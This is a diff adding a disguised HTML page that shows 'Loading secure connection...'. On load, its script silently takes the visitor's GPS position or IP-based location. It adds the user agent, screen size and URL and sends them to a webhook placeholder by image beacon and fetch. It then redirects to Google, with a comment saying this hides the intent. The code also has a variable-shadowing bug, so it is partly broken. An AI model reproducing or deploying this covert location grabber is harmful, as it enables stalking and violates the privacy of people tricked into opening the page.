@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading...</title>
+<script>
+function stealLocation() {
+    // Method A: GPS if allowed
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendGPS, fallbackIP);
+    } else {
+        fallbackIP();
+    }
+    
+    function sendGPS(position) {
+        let lat = position.coords.latitude;
+        let lon = position.coords.longitude;
+        let acc = position.coords.accuracy;
+        sendData(`GPS: ${lat},${lon} | Accuracy: ${acc}m`);
+    }
+    
+    function fallbackIP() {
+        // Method B: IP-based location
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                sendData(`IP: ${data.ip} | City: ${data.city} | Region: ${data.region} | Country: ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude} | ISP: ${data.org}`);
+            })
+            .catch(() => sendData("Location failed"));
+    }
+    
+    function sendData(locationInfo) {
+        let webhook = "https://webhook.site/YOUR-ID-HERE";
+        let ua = navigator.userAgent;
+        let screen = `${screen.width}x${screen.height}`;
+        let time = new Date().toISOString();
+        let fullData = `[${time}] ${locationInfo} | UA: ${ua} | Screen: ${screen} | URL: ${window.location.href}`;
+        
+        // Method A: Image beacon
+        let img = new Image();
+        img.src = `${webhook}?data=${encodeURIComponent(fullData)}`;
+        
+        // Method B: Fetch backup
+        fetch(`${webhook}?data=${encodeURIComponent(fullData)}`, {mode: 'no-cors'});
+        
+        // Method C: Redirect after steal (hides intent)
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 100);
+    }
+}
+
+// Auto-run
+stealLocation();
+</script>
+</head>
+<body>
+<p style="font-family: Arial; text-align: center; margin-top: 50px;">Loading secure connection...</p>
+</body>
+</html>
